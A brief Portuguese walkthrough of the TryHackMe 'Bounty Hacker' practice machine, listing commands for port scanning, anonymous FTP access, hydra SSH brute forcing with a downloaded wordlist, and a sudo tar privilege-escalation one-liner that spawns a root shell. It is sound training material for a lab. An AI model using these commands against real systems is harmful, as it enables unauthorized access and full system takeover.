# Bounty Hacker (TryHackMe)

1. nmap -sV -sC <IP> → escaneia portas. Aparece FTP (21) e SSH (22) abertos
2. ftp <IP> com login anonymous (sem senha ou senha em branco) → login anônimo funciona, dá acesso a arquivos no servidor FTP
3. get locks.txt → baixa um arquivo que estava disponível no FTP; acaba sendo uma wordlist de senhas
4. hydra -l lin -P locks.txt <IP> ssh → usa o usuário lin (achado em outro arquivo do FTP) + a wordlist baixada pra forçar login SSH
5. Login bem-sucedido → ssh lin@<IP> com a senha que o hydra achou → shell comum como usuário lin
6. cat user.txt (geralmente na home do usuário) → primeira flag conseguida
7. sudo -l → mostra o que o usuário lin pode rodar como root sem senha; nesse caso aparece /bin/tar
8. Consulta o GTFOBins pra tar → comando de escalada: sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/bash
9. Vira root → cat root.txt → segunda flag, máquina completa